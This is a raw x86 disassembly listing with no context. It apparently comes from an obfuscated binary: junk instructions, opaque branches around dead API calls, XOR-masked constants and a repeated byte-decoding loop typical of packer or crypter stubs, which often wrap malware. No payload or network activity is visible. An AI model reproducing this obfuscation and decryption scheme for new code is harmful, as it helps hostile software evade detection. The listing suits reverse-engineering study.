  41d4bc:	add    eax,0x38ab
  41d4c1:	xor    eax,edi
  41d4c3:	add    eax,DWORD PTR [ebp-0x18]
  41d4c6:	mov    ebx,ecx
  41d4c8:	xor    eax,esi
  41d4ca:	sub    ebx,eax
  41d4cc:	cmp    ebx,edx
  41d4ce:	jbe    0x41d428
  41d4d4:	pop    edi
  41d4d5:	pop    esi
  41d4d6:	pop    ebx
  41d4d7:	leave  
  41d4d8:	ret    0xc
  41d4db:	push   ebp
  41d4dc:	mov    ebp,esp
  41d4de:	sub    esp,0x7c
  41d4e1:	or     DWORD PTR ds:0x4229a6,ebx
  41d4e7:	push   ebx
  41d4e8:	sub    ebx,edx
  41d4ea:	push   esi
  41d4eb:	push   edi
  41d4ec:	movzx  ebx,BYTE PTR ds:0x4228ae
  41d4f3:	and    DWORD PTR ds:0x422986,ebx
  41d4f9:	mov    eax,DWORD PTR [ebp+0x8]
  41d4fc:	mov    ecx,DWORD PTR [ebp+0xc]
  41d4ff:	shrd   eax,ecx,0x2
  41d503:	cmp    DWORD PTR ds:0x4229ce,0x0
  41d50a:	mov    DWORD PTR ds:0x42298a,edx
  41d510:	mov    esi,0x951
  41d515:	jmp    0x41d570
  41d51a:	movzx  ebx,BYTE PTR ds:0x42298a
  41d521:	jbe    0x41d553
  41d527:	push   0x47c6
  41d52c:	push   DWORD PTR [ebp-0x28]
  41d52f:	call   DWORD PTR ds:0x42a038
  41d535:	and    esi,0x3e8f
  41d53b:	mov    esi,DWORD PTR ds:0x4228e6
  41d541:	add    DWORD PTR ds:0x42291e,esi
  41d547:	sub    esi,edx
  41d549:	sub    DWORD PTR ds:0x42297e,0xf26
  41d553:	adc    DWORD PTR ds:0x4228ee,0x541b
  41d55d:	xor    esi,esi
  41d55f:	or     esi,DWORD PTR ds:0x422a3a
  41d565:	mov    edi,DWORD PTR ds:0x422ae6
  41d56b:	sub    edi,esi
  41d56d:	add    esi,DWORD PTR [esi+edi*1]
  41d570:	shr    ecx,0x2
  41d573:	mov    ecx,DWORD PTR [ebp+0x8]
  41d576:	mov    edx,DWORD PTR [ebp+0xc]
  41d579:	inc    ebx
  41d57a:	xor    edx,edx
  41d57c:	cmp    DWORD PTR ds:0x4229a2,0x0
  41d583:	mov    ebx,DWORD PTR ds:0x422996
  41d589:	mov    DWORD PTR ds:0x422976,0x477d
  41d593:	mov    DWORD PTR ds:0x4228c2,ebx
  41d599:	mov    DWORD PTR ds:0x4228ae,0x7a5c
  41d5a3:	jmp    0x41d5e6
  41d5a8:	mov    ebx,0x5fbd
  41d5ad:	je     0x41d5e2
  41d5b3:	push   DWORD PTR [ebp-0x28]
  41d5b6:	push   0x41f8
  41d5bb:	push   0x6fc1
  41d5c0:	push   DWORD PTR [ebp-0x24]
  41d5c3:	call   DWORD PTR ds:0x42a05c
  41d5c9:	and    DWORD PTR ds:0x42296a,edi
  41d5cf:	sub    edi,esi
  41d5d1:	mov    ebx,DWORD PTR ds:0x422a86
  41d5d7:	mov    esi,DWORD PTR ds:0x422a9a
  41d5dd:	sub    esi,ebx
  41d5df:	sub    ebx,DWORD PTR [ebx+esi*1]
  41d5e2:	sbb    edi,esi
  41d5e4:	not    esi
  41d5e6:	mov    esi,0x2e9a655c
  41d5eb:	xor    eax,esi
  41d5ed:	cmp    DWORD PTR ds:0x422946,0x0
  41d5f4:	mov    DWORD PTR ds:0x4229aa,ecx
  41d5fa:	mov    DWORD PTR ds:0x422936,0x719b
  41d604:	mov    DWORD PTR ds:0x42290a,0x79d9
  41d60e:	mov    DWORD PTR ds:0x4229ba,ecx
  41d614:	jmp    0x41d69d
  41d619:	mov    DWORD PTR ds:0x4229b6,0x57de
  41d623:	mov    DWORD PTR ds:0x42298e,0x236c
  41d62d:	ja     0x41d66f
  41d633:	push   0x3fc3
  41d638:	push   0x4225dc
  41d63d:	call   DWORD PTR ds:0x42a060
  41d643:	sbb    ebx,DWORD PTR ds:0x42294a
  41d649:	mov    ebx,DWORD PTR ds:0x422892
  41d64f:	adc    DWORD PTR ds:0x42289e,ebx
  41d655:	xor    ebx,ebx
  41d657:	or     ebx,DWORD PTR ds:0x422a7a
  41d65d:	mov    ebx,DWORD PTR [ebx]
  41d65f:	adc    DWORD PTR ds:0x4229d2,ebx
  41d665:	mov    DWORD PTR ds:0x4228ba,0x6b73
  41d66f:	and    ebx,edi
  41d671:	sub    edi,DWORD PTR ds:0x422972
  41d677:	adc    ebx,DWORD PTR ds:0x422922
  41d67d:	movzx  ebx,BYTE PTR ds:0x422926
  41d684:	adc    DWORD PTR ds:0x42294e,ebx
  41d68a:	mov    edi,DWORD PTR ds:0x4229da
  41d690:	xor    ebx,ebx
  41d692:	or     ebx,DWORD PTR ds:0x422a2e
  41d698:	sub    ebx,edi
  41d69a:	or     edi,DWORD PTR [edi+ebx*1]
  41d69d:	or     eax,edx
  41d69f:	mov    DWORD PTR ds:0x4228fe,0x3549
  41d6a9:	mov    DWORD PTR [ebp-0x28],eax
  41d6ac:	mov    eax,DWORD PTR [ebp+0x8]
  41d6af:	or     edx,0x76a
  41d6b5:	shl    ecx,0x1e
  41d6b8:	cmp    DWORD PTR ds:0x4229aa,0x0
  41d6bf:	mov    DWORD PTR ds:0x42297e,ebx
  41d6c5:	mov    ecx,DWORD PTR ds:0x4229be
  41d6cb:	mov    DWORD PTR ds:0x422962,0x9fe
  41d6d5:	jmp    0x41d740
  41d6da:	mov    DWORD PTR ds:0x4228de,edx
  41d6e0:	mov    edx,DWORD PTR ds:0x4228ae
  41d6e6:	jae    0x41d725
  41d6ec:	push   DWORD PTR [ebp-0x18]
  41d6ef:	push   DWORD PTR [ebp-0x18]
  41d6f2:	call   DWORD PTR ds:0x42a064
  41d6f8:	mov    edx,DWORD PTR ds:0x422abe
  41d6fe:	mov    ecx,DWORD PTR ds:0x422ac6
  41d704:	sub    edx,ecx
  41d706:	or     edx,DWORD PTR [edx+ecx*1]
  41d709:	mov    edi,DWORD PTR ds:0x4229ba
  41d70f:	sbb    edi,DWORD PTR ds:0x4228ba
  41d715:	mov    DWORD PTR ds:0x4229ba,edi
  41d71b:	or     DWORD PTR ds:0x422966,0x5f8
  41d725:	adc    DWORD PTR ds:0x42298e,0x1669
  41d72f:	mov    ecx,DWORD PTR ds:0x422a52
  41d735:	mov    ebx,DWORD PTR ds:0x422ac2
  41d73b:	sub    ebx,ecx
  41d73d:	or     ecx,DWORD PTR [ecx+ebx*1]
  41d740:	mov    ecx,DWORD PTR [ebp+0xc]
  41d743:	xor    edi,0x396f
  41d749:	shrd   eax,ecx,0x2
  41d74d:	adc    DWORD PTR ds:0x42295a,edi
  41d753:	xor    eax,esi
  41d755:	adc    ebx,edi
  41d757:	shr    ecx,0x2
  41d75a:	mov    ecx,DWORD PTR [ebp+0x8]
  41d75d:	inc    ebx
  41d75e:	mov    edx,DWORD PTR [ebp+0xc]
  41d761:	xor    edx,edx
  41d763:	xor    ebx,DWORD PTR ds:0x42295a
  41d769:	or     eax,edx
  41d76b:	sub    edx,0x59e2
  41d771:	mov    DWORD PTR [ebp-0x28],eax
  41d774:	mov    eax,ds:0x4220e8
  41d779:	add    DWORD PTR ds:0x4228d2,edx
  41d77f:	mov    eax,DWORD PTR [eax]
  41d781:	xor    DWORD PTR ds:0x42293a,0x4228c2
  41d78b:	mov    DWORD PTR [ebp-0xc],eax
  41d78e:	mov    eax,ds:0x422308
  41d793:	sub    ebx,0x7e01
  41d799:	mov    eax,DWORD PTR [eax]
  41d79b:	mov    ebx,DWORD PTR ds:0x422a42
  41d7a1:	xor    edi,edi
  41d7a3:	xor    edi,DWORD PTR ds:0x422a9a
  41d7a9:	sub    edi,ebx
  41d7ab:	and    ebx,DWORD PTR [ebx+edi*1]
  41d7ae:	mov    DWORD PTR [ebp-0x10],eax
  41d7b1:	cmp    DWORD PTR ds:0x4229c6,0x0
  41d7b8:	mov    DWORD PTR ds:0x42295a,ebx
  41d7be:	mov    DWORD PTR ds:0x42297e,0x12ca
  41d7c8:	jmp    0x41d808
  41d7cd:	mov    DWORD PTR ds:0x4229c2,ebx
  41d7d3:	jl     0x41d7f0
  41d7d9:	push   0x4227af
  41d7de:	call   DWORD PTR ds:0x42a180
  41d7e4:	dec    DWORD PTR ds:0x4228de
  41d7ea:	or     edi,DWORD PTR ds:0x4229c6
  41d7f0:	adc    DWORD PTR ds:0x422902,0x16ea
  41d7fa:	or     DWORD PTR ds:0x42291e,ecx
  41d800:	neg    edi
  41d802:	sbb    DWORD PTR ds:0x4228c6,edx
  41d808:	mov    eax,DWORD PTR [ebp-0xc]
  41d80b:	or     eax,DWORD PTR ds:0x422936
  41d811:	mov    eax,DWORD PTR [ebp-0xc]
  41d814:	or     DWORD PTR ds:0x42297e,0xd91
  41d81e:	shl    ecx,0x1e
  41d821:	sub    DWORD PTR ds:0x4228da,0x4229c2
  41d82b:	xor    ecx,ecx
  41d82d:	adc    DWORD PTR ds:0x422972,ecx
  41d833:	shld   ecx,eax,0x2
  41d837:	cmp    DWORD PTR ds:0x4229ba,0x0
  41d83e:	movzx  ebx,BYTE PTR ds:0x422926
  41d845:	mov    DWORD PTR ds:0x4228fe,0x7bb6
  41d84f:	mov    DWORD PTR ds:0x422922,edi
  41d855:	movzx  ebx,BYTE PTR ds:0x422966
  41d85c:	jmp    0x41d8d5
  41d861:	mov    DWORD PTR ds:0x4229b6,0x5617
  41d86b:	mov    DWORD PTR ds:0x4229ca,0x1a8d
  41d875:	je     0x41d8aa
  41d87b:	push   0x4228c6
  41d880:	push   0x422906
  41d885:	push   0x148f
  41d88a:	call   DWORD PTR ds:0x42a068
  41d890:	xor    ebx,ebx
  41d892:	add    ebx,DWORD PTR ds:0x422a8a
  41d898:	mov    edx,DWORD PTR ds:0x422ada
  41d89e:	sub    ebx,edx
  41d8a0:	xor    ebx,DWORD PTR [ebx+edx*1]
  41d8a3:	add    ebx,DWORD PTR ds:0x422906
  41d8a9:	inc    ebx
  41d8aa:	movzx  edx,BYTE PTR ds:0x42291e
  41d8b1:	or     edx,DWORD PTR ds:0x42290e
  41d8b7:	mov    DWORD PTR ds:0x42291e,edx
  41d8bd:	mov    DWORD PTR ds:0x4228be,0x3c15
  41d8c7:	xor    edi,edi
  41d8c9:	add    edi,DWORD PTR ds:0x42296a
  41d8cf:	and    DWORD PTR ds:0x4229a2,edi
  41d8d5:	mov    edi,DWORD PTR [ebp+0x8]
  41d8d8:	mov    ebx,DWORD PTR [ebp+0xc]
  41d8db:	shl    eax,0x2
  41d8de:	and    edx,DWORD PTR ds:0x422996
  41d8e4:	mov    DWORD PTR [ebp-0x34],ebx
  41d8e7:	or     edx,DWORD PTR ds:0x422942
  41d8ed:	xor    ebx,ebx
  41d8ef:	or     edx,DWORD PTR ds:0x42297e
  41d8f5:	mov    edx,0x9c0a89d8
  41d8fa:	xor    DWORD PTR ds:0x42293e,0x38e7
  41d904:	xor    eax,0xba699573
  41d909:	xor    ecx,edx
  41d90b:	mov    DWORD PTR ds:0x422966,0x5827
  41d915:	inc    ebx
  41d916:	mov    DWORD PTR ds:0x42288e,0x1c53
  41d920:	mov    DWORD PTR [ebp-0x1c],0xa3e69b9d
  41d927:	mov    DWORD PTR ds:0x42296a,0x3d21
  41d931:	mov    DWORD PTR [ebp-0x18],0xa3e6929d
  41d938:	mov    DWORD PTR ds:0x4228d6,0x742f
  41d942:	cmp    eax,edi
  41d944:	mov    DWORD PTR ds:0x42289e,0x5996
  41d94e:	jne    0x41d971
  41d954:	mov    DWORD PTR ds:0x4228e2,0x7e38
  41d95e:	cmp    ecx,DWORD PTR [ebp-0x34]
  41d961:	mov    DWORD PTR ds:0x422976,0x4e71
  41d96b:	je     0x41df0a
  41d971:	xor    edi,edi
  41d973:	mov    eax,DWORD PTR [ebp-0x10]
  41d976:	mov    eax,DWORD PTR [ebp-0x10]
  41d979:	and    edi,0x18bc
  41d97f:	xor    ecx,ecx
  41d981:	shld   ecx,eax,0x2
  41d985:	cmp    DWORD PTR ds:0x4228a6,0x0
  41d98c:	not    edi
  41d98e:	mov    DWORD PTR ds:0x422916,0x65a0
  41d998:	mov    edi,DWORD PTR ds:0x4229c6
  41d99e:	jmp    0x41d9f8
  41d9a3:	mov    DWORD PTR ds:0x42291e,0x42bf
  41d9ad:	jl     0x41d9d8
  41d9b3:	push   DWORD PTR [ebp-0x18]
  41d9b6:	call   DWORD PTR ds:0x42a184
  41d9bc:	mov    edi,DWORD PTR ds:0x42292a
  41d9c2:	xor    DWORD PTR ds:0x42297e,edi
  41d9c8:	add    edi,DWORD PTR ds:0x422926
  41d9ce:	and    DWORD PTR ds:0x42296e,0x3699
  41d9d8:	sub    DWORD PTR ds:0x4229d2,ecx
  41d9de:	xor    DWORD PTR ds:0x42291a,0x37de
  41d9e8:	sbb    edi,0x14bf
  41d9ee:	sbb    DWORD PTR ds:0x422906,0x2f26
  41d9f8:	shl    eax,0x2
  41d9fb:	xor    ecx,edx
  41d9fd:	mov    edx,DWORD PTR [ebp+0x8]
  41da00:	cmp    DWORD PTR ds:0x4228f6,0x0
  41da07:	mov    DWORD PTR ds:0x4229b2,0x11be
  41da11:	mov    edi,DWORD PTR ds:0x42298a
  41da17:	mov    edi,0x436a
  41da1c:	mov    edi,0x787d
  41da21:	jmp    0x41da8c
  41da26:	mov    DWORD PTR ds:0x42294e,ecx
  41da2c:	jne    0x41da5f
  41da32:	push   0x58ed
  41da37:	push   DWORD PTR [ebp-0xc]
  41da3a:	push   0x4fe0
  41da3f:	call   DWORD PTR ds:0x42a188
  41da45:	sub    DWORD PTR ds:0x4228c2,0x42290a
  41da4f:	inc    DWORD PTR ds:0x422916
  41da55:	sub    DWORD PTR ds:0x4228f2,0x2f59
  41da5f:	movzx  edi,BYTE PTR ds:0x42295e
  41da66:	or     edi,DWORD PTR ds:0x4229b6
  41da6c:	mov    DWORD PTR ds:0x42295e,edi
  41da72:	sub    DWORD PTR ds:0x4229c2,edx
  41da78:	adc    DWORD PTR ds:0x42299a,0x4229a2
  41da82:	and    DWORD PTR ds:0x4228be,0x217e
  41da8c:	mov    edi,DWORD PTR [ebp+0xc]
  41da8f:	xor    eax,0xba699573
  41da94:	mov    DWORD PTR ds:0x4229ae,0x94b
  41da9e:	cmp    eax,edx
  41daa0:	mov    DWORD PTR ds:0x4229be,0x7ea4
  41daaa:	jne    0x41dac2
  41dab0:	mov    DWORD PTR ds:0x4228ee,0x77f8
  41daba:	cmp    ecx,edi
  41dabc:	je     0x41df0a
  41dac2:	cmp    DWORD PTR ds:0x42292a,0x0
  41dac9:	mov    DWORD PTR ds:0x4228e6,0x4ba6
  41dad3:	mov    DWORD PTR ds:0x42289e,0x1c76
  41dadd:	jmp    0x41db40
  41dae2:	mov    ecx,DWORD PTR ds:0x422892
  41dae8:	mov    DWORD PTR ds:0x422892,0x488a
  41daf2:	jg     0x41db27
  41daf8:	push   0x42298a
  41dafd:	push   DWORD PTR [ebp-0xc]
  41db00:	push   0x422737
  41db05:	push   0x58d5
  41db0a:	call   DWORD PTR ds:0x42a18c
  41db10:	mov    ecx,DWORD PTR ds:0x42299a
  41db16:	sbb    DWORD PTR ds:0x4229aa,ecx
  41db1c:	xor    DWORD PTR ds:0x422986,0x108
  41db26:	dec    ecx
  41db27:	sbb    ecx,DWORD PTR ds:0x4229c2
  41db2d:	mov    ecx,DWORD PTR ds:0x422aa6
  41db33:	xor    edi,edi
  41db35:	xor    edi,DWORD PTR ds:0x422aee
  41db3b:	sub    ecx,edi
  41db3d:	add    ecx,DWORD PTR [ecx+edi*1]
  41db40:	mov    eax,DWORD PTR [ebp-0x18]
  41db43:	adc    DWORD PTR ds:0x422922,0x2ce9
  41db4d:	mov    ecx,DWORD PTR [ebp-0x18]
  41db50:	neg    edi
  41db52:	xor    ecx,ebx
  41db54:	shl    ecx,0x1e
  41db57:	sbb    DWORD PTR ds:0x4229b2,edx
  41db5d:	mov    edi,0xa3e69a9f
  41db62:	xor    eax,edi
  41db64:	shr    eax,0x2
  41db67:	or     DWORD PTR ds:0x42298a,0x42289a
  41db71:	or     eax,ecx
  41db73:	cmp    DWORD PTR ds:0x42299a,0x0
  41db7a:	movzx  ecx,WORD PTR ds:0x42293a
  41db81:	not    ecx
  41db83:	jmp    0x41dbe7
  41db88:	mov    DWORD PTR ds:0x4229d2,0x1c9
  41db92:	je     0x41dbc1
  41db98:	push   0x1982
  41db9d:	call   DWORD PTR ds:0x42a2a4
  41dba3:	sub    ecx,0x256c
  41dba9:	sub    DWORD PTR ds:0x4229d2,edx
  41dbaf:	mov    ecx,DWORD PTR ds:0x4229ca
  41dbb5:	or     DWORD PTR ds:0x42297a,ecx
  41dbbb:	add    DWORD PTR ds:0x42293e,edx
  41dbc1:	xor    ecx,0x2a90
  41dbc7:	adc    ecx,DWORD PTR ds:0x4228e2
  41dbcd:	xor    DWORD PTR ds:0x4228c2,edx
  41dbd3:	xor    ecx,ecx
  41dbd5:	or     ecx,DWORD PTR ds:0x4228e2
  41dbdb:	and    DWORD PTR ds:0x4228f6,ecx
  41dbe1:	sbb    DWORD PTR ds:0x422932,edx
  41dbe7:	mov    DWORD PTR [ebp-0x34],eax
  41dbea:	xor    ecx,0x70df
  41dbf0:	mov    eax,ds:0x422268
  41dbf5:	mov    ecx,DWORD PTR ds:0x4228d2
  41dbfb:	adc    ecx,DWORD PTR ds:0x422976
  41dc01:	mov    DWORD PTR ds:0x4228d2,ecx
  41dc07:	mov    DWORD PTR [ebp-0x34],eax
  41dc0a:	xor    eax,eax
  41dc0c:	xor    eax,DWORD PTR ds:0x4228a6
  41dc12:	sbb    DWORD PTR ds:0x42294a,eax
  41dc18:	mov    eax,DWORD PTR [ebp-0xc]
  41dc1b:	cmp    DWORD PTR ds:0x4229c6,0x0
  41dc22:	mov    DWORD PTR ds:0x4228fe,0x1213
  41dc2c:	movzx  ecx,WORD PTR ds:0x4228b2
  41dc33:	jmp    0x41dca0
  41dc38:	mov    DWORD PTR ds:0x42298a,0x52a1
  41dc42:	mov    DWORD PTR ds:0x422962,edx
  41dc48:	jg     0x41dc7d
  41dc4e:	push   DWORD PTR [ebp-0x24]
  41dc51:	push   0x4008
  41dc56:	push   0x37a6
  41dc5b:	call   DWORD PTR ds:0x42a06c
  41dc61:	and    ecx,DWORD PTR ds:0x422946
  41dc67:	sub    DWORD PTR ds:0x42291a,ebx
  41dc6d:	adc    DWORD PTR ds:0x4228e6,edx
  41dc73:	xor    DWORD PTR ds:0x42290a,0x1acd
  41dc7d:	dec    ecx
  41dc7e:	add    DWORD PTR ds:0x42289a,0x219e
  41dc88:	mov    ecx,DWORD PTR ds:0x4228fa
  41dc8e:	and    DWORD PTR ds:0x42291a,ecx
  41dc94:	mov    ecx,DWORD PTR ds:0x4228e6
  41dc9a:	or     DWORD PTR ds:0x4228ae,ecx
  41dca0:	mov    DWORD PTR [ebp-0x14],eax
  41dca3:	cmp    DWORD PTR ds:0x42299a,0x0
  41dcaa:	mov    DWORD PTR ds:0x4228f6,0x5b1a
  41dcb4:	mov    ecx,0x5f2a
  41dcb9:	jmp    0x41dcec
  41dcbe:	mov    DWORD PTR ds:0x422922,0x1bb2
  41dcc8:	jg     0x41dcdf
  41dcce:	push   DWORD PTR [ebp-0x1c]
  41dcd1:	call   DWORD PTR ds:0x42a190
  41dcd7:	or     ecx,ecx
  41dcd9:	add    ecx,DWORD PTR ds:0x4228ba
  41dcdf:	xor    ecx,ecx
  41dce1:	dec    ecx
  41dce2:	or     DWORD PTR ds:0x4228de,0x336d
  41dcec:	mov    ecx,DWORD PTR [ebp-0x14]
  41dcef:	push   0x4
  41dcf1:	pop    eax
  41dcf2:	sub    eax,ecx
  41dcf4:	mov    ecx,DWORD PTR [ebp-0x10]
  41dcf7:	add    ecx,eax
  41dcf9:	mov    DWORD PTR [ebp-0x24],ecx
  41dcfc:	lea    eax,[ebp-0x30]
  41dcff:	mov    DWORD PTR [ebp-0x2c],eax
  41dd02:	mov    eax,DWORD PTR [ebp-0x1c]
  41dd05:	mov    ecx,DWORD PTR [ebp-0x1c]
  41dd08:	xor    eax,edi
  41dd0a:	xor    ecx,ebx
  41dd0c:	shr    eax,0x2
  41dd0f:	shl    ecx,0x1e
  41dd12:	or     eax,ecx
  41dd14:	mov    DWORD PTR [ebp-0x20],eax
  41dd17:	mov    DWORD PTR [ebp-0x8],0xa3e69a8d
  41dd1e:	mov    eax,DWORD PTR [ebp-0x8]
  41dd21:	mov    ecx,DWORD PTR [ebp-0x8]
  41dd24:	xor    eax,edi
  41dd26:	xor    ecx,ebx
  41dd28:	shr    eax,0x2
  41dd2b:	shl    ecx,0x1e
  41dd2e:	or     ecx,eax
  41dd30:	push   ecx
  41dd31:	lea    eax,[ebp-0x8]
  41dd34:	push   eax
  41dd35:	lea    eax,[ebp-0x7c]
  41dd38:	push   eax
  41dd39:	call   0x41d37f
  41dd3e:	mov    eax,DWORD PTR [ebp-0x8]
  41dd41:	mov    ecx,DWORD PTR [ebp-0x8]
  41dd44:	xor    eax,edi
  41dd46:	xor    ecx,ebx
  41dd48:	shr    eax,0x2
  41dd4b:	shl    ecx,0x1e
  41dd4e:	or     ecx,eax
  41dd50:	push   ecx
  41dd51:	lea    eax,[ebp-0x14]
  41dd54:	push   eax
  41dd55:	mov    eax,DWORD PTR [ebp+0x8]
  41dd58:	mov    ecx,DWORD PTR [ebp+0xc]
  41dd5b:	shrd   eax,ecx,0x2
  41dd5f:	shr    ecx,0x2
  41dd62:	mov    ecx,DWORD PTR [ebp+0x8]
  41dd65:	mov    edx,DWORD PTR [ebp+0xc]
  41dd68:	xor    eax,esi
  41dd6a:	xor    edx,edx
  41dd6c:	or     eax,edx
  41dd6e:	lea    eax,[ebp+eax*4-0x78]
  41dd72:	push   eax
  41dd73:	shl    ecx,0x1e
  41dd76:	call   0x41d37f
  41dd7b:	mov    eax,DWORD PTR [ebp-0x8]
  41dd7e:	mov    ecx,DWORD PTR [ebp-0x8]
  41dd81:	xor    eax,edi
  41dd83:	xor    ecx,ebx
  41dd85:	shr    eax,0x2
  41dd88:	shl    ecx,0x1e
  41dd8b:	or     ecx,eax
  41dd8d:	push   ecx
  41dd8e:	lea    eax,[ebp-0x24]
  41dd91:	push   eax
  41dd92:	mov    eax,DWORD PTR [ebp+0x10]
  41dd95:	mov    ecx,DWORD PTR [ebp+0x14]
  41dd98:	shrd   eax,ecx,0x2
  41dd9c:	shr    ecx,0x2
  41dd9f:	mov    ecx,DWORD PTR [ebp+0x10]
  41dda2:	mov    edx,DWORD PTR [ebp+0x14]
  41dda5:	xor    eax,esi
  41dda7:	xor    edx,edx
  41dda9:	or     eax,edx
  41ddab:	lea    eax,[ebp+eax*4-0x78]
  41ddaf:	push   eax
  41ddb0:	shl    ecx,0x1e
  41ddb3:	call   0x41d37f
  41ddb8:	mov    eax,DWORD PTR [ebp-0x8]
  41ddbb:	mov    ecx,DWORD PTR [ebp-0x8]
  41ddbe:	xor    ecx,ebx
  41ddc0:	xor    eax,edi
  41ddc2:	shl    ecx,0x1e
  41ddc5:	shr    eax,0x2
  41ddc8:	or     ecx,eax
  41ddca:	push   ecx
  41ddcb:	lea    eax,[ebp-0x20]
  41ddce:	push   eax
  41ddcf:	mov    eax,DWORD PTR [ebp+0x10]
  41ddd2:	mov    ecx,DWORD PTR [ebp+0x14]
  41ddd5:	shrd   eax,ecx,0x2
  41ddd9:	shr    ecx,0x2
  41dddc:	mov    ecx,DWORD PTR [ebp+0x10]
  41dddf:	mov    edx,DWORD PTR [ebp+0x14]
  41dde2:	xor    edx,edx
  41dde4:	xor    eax,esi
  41dde6:	or     eax,edx
  41dde8:	shl    ecx,0x1e
  41ddeb:	mov    ecx,DWORD PTR [ebp+0x10]
  41ddee:	mov    edx,DWORD PTR [ebp+0x14]
  41ddf1:	shrd   ecx,edx,0x2
  41ddf5:	shr    edx,0x2
  41ddf8:	mov    edx,DWORD PTR [ebp+0x10]
  41ddfb:	mov    ebx,DWORD PTR [ebp+0x14]
  41ddfe:	xor    ecx,esi
  41de00:	xor    ebx,ebx
  41de02:	or     ecx,ebx
  41de04:	add    eax,ecx
  41de06:	lea    eax,[ebp+eax*4-0x78]
  41de0a:	push   eax
  41de0b:	shl    edx,0x1e
  41de0e:	call   0x41d37f
  41de13:	mov    eax,DWORD PTR [ebp-0x8]
  41de16:	mov    ecx,DWORD PTR [ebp-0x8]
  41de19:	xor    ecx,0x1
  41de1c:	shl    ecx,0x1e
  41de1f:	xor    eax,edi
  41de21:	shr    eax,0x2
  41de24:	or     ecx,eax
  41de26:	push   ecx
  41de27:	lea    eax,[ebp-0x2c]
  41de2a:	push   eax
  41de2b:	mov    eax,DWORD PTR [ebp+0x10]
  41de2e:	mov    ecx,DWORD PTR [ebp+0x14]
  41de31:	shrd   eax,ecx,0x2
  41de35:	shr    ecx,0x2
  41de38:	mov    ecx,DWORD PTR [ebp+0x10]
  41de3b:	mov    edx,DWORD PTR [ebp+0x14]
  41de3e:	xor    edx,edx
  41de40:	shl    ecx,0x1e
  41de43:	mov    ecx,DWORD PTR [ebp+0x10]
  41de46:	xor    eax,esi
  41de48:	or     eax,edx
  41de4a:	mov    edx,DWORD PTR [ebp+0x14]
  41de4d:	shrd   ecx,edx,0x2
  41de51:	shr    edx,0x2
  41de54:	mov    edx,DWORD PTR [ebp+0x10]
  41de57:	mov    ebx,DWORD PTR [ebp+0x14]
  41de5a:	xor    ecx,esi
  41de5c:	xor    ebx,ebx
  41de5e:	or     ecx,ebx
  41de60:	shl    edx,0x1e
  41de63:	add    eax,ecx
  41de65:	mov    ecx,DWORD PTR [ebp+0x10]
  41de68:	mov    edx,DWORD PTR [ebp+0x14]
  41de6b:	shrd   ecx,edx,0x2
  41de6f:	shr    edx,0x2
  41de72:	mov    edx,DWORD PTR [ebp+0x10]
  41de75:	mov    ebx,DWORD PTR [ebp+0x14]
  41de78:	xor    ecx,esi
  41de7a:	xor    ebx,ebx
  41de7c:	or     ecx,ebx
  41de7e:	add    eax,ecx
  41de80:	lea    eax,[ebp+eax*4-0x78]
  41de84:	push   eax
  41de85:	shl    edx,0x1e
  41de88:	call   0x41d37f
  41de8d:	mov    eax,DWORD PTR [ebp-0x7c]
  41de90:	mov    ecx,DWORD PTR [ebp-0x7c]
  41de93:	xor    eax,edi
  41de95:	shr    eax,0x2
  41de98:	inc    ebx
  41de99:	xor    ecx,ebx
  41de9b:	shl    ecx,0x1e
  41de9e:	or     ecx,eax
  41dea0:	mov    DWORD PTR [ebp-0x7c],ecx
  41dea3:	lea    eax,[ebp-0x7c]
  41dea6:	push   eax
  41dea7:	mov    eax,DWORD PTR [ebp+0x10]
  41deaa:	mov    ecx,DWORD PTR [ebp+0x14]
  41dead:	shrd   eax,ecx,0x2
  41deb1:	shr    ecx,0x2
  41deb4:	mov    ecx,DWORD PTR [ebp+0x10]
  41deb7:	mov    edx,DWORD PTR [ebp+0x14]
  41deba:	xor    eax,esi
  41debc:	xor    edx,edx
  41debe:	or     eax,edx
  41dec0:	push   eax
  41dec1:	mov    eax,ds:0x422298
  41dec6:	mov    edi,0x4221de
  41decb:	push   edi
  41decc:	push   DWORD PTR [eax]
  41dece:	shl    ecx,0x1e
  41ded1:	call   0x41f8ac
  41ded6:	lea    eax,[ebp-0x7c]
  41ded9:	push   eax
  41deda:	mov    eax,DWORD PTR [ebp+0x10]
  41dedd:	mov    ecx,DWORD PTR [ebp+0x14]
  41dee0:	shrd   eax,ecx,0x2
  41dee4:	shr    ecx,0x2
  41dee7:	mov    ecx,DWORD PTR [ebp+0x10]
  41deea:	mov    edx,DWORD PTR [ebp+0x14]
  41deed:	xor    eax,esi
  41deef:	xor    edx,edx
  41def1:	or     eax,edx
  41def3:	push   eax
  41def4:	mov    eax,ds:0x422298
  41def9:	push   edi
  41defa:	push   DWORD PTR [eax]
  41defc:	shl    ecx,0x1e
  41deff:	call   0x41f8ac
  41df04:	mov    eax,DWORD PTR [ebp-0x30]
  41df07:	mov    eax,DWORD PTR [ebp-0x20]
  41df0a:	mov    edi,DWORD PTR [ebp-0x14]
  41df0d:	mov    eax,DWORD PTR [ebp-0x24]
  41df10:	mov    ecx,edi
  41df12:	mov    DWORD PTR [ebp-0x18],eax
  41df15:	rol    ecx,0x2
  41df18:	mov    eax,0xa3e69a9d
  41df1d:	xor    ecx,eax
  41df1f:	cmp    ecx,eax
  41df21:	je     0x41e003
  41df27:	mov    DWORD PTR [ebp-0x1c],0x1001
  41df2e:	mov    ecx,DWORD PTR [ebp-0x18]
  41df31:	xor    eax,eax
  41df33:	mov    DWORD PTR [ebp-0x34],ecx
  41df36:	test   ecx,ecx
  41df38:	je     0x41df64
  41df3e:	mov    cl,BYTE PTR [eax+edi*1]
  41df41:	mov    BYTE PTR [ebp-0x1],cl
  41df44:	movzx  ecx,BYTE PTR [ebp-0x1]
  41df48:	sub    ecx,0xea
  41df4e:	mov    BYTE PTR [ebp-0x1],cl
  41df51:	ror    BYTE PTR [ebp-0x1],1
  41df54:	mov    cl,BYTE PTR [ebp-0x1]
  41df57:	mov    BYTE PTR [eax+edi*1],cl
  41df5a:	inc    eax
  41df5b:	cmp    eax,DWORD PTR [ebp-0x34]
  41df5e:	jb     0x41df3e
  41df64:	dec    DWORD PTR [ebp-0x1c]
  41df67:	jne    0x41df2e
  41df6d:	mov    eax,DWORD PTR [ebp+0x8]
  41df70:	mov    ecx,DWORD PTR [ebp+0xc]
  41df73:	shrd   eax,ecx,0x2
  41df77:	shr    ecx,0x2
  41df7a:	mov    ecx,DWORD PTR [ebp+0x8]
  41df7d:	mov    edx,DWORD PTR [ebp+0xc]
  41df80:	xor    eax,esi
  41df82:	xor    edx,edx
  41df84:	or     eax,edx
  41df86:	push   ebx
  41df87:	add    eax,edi
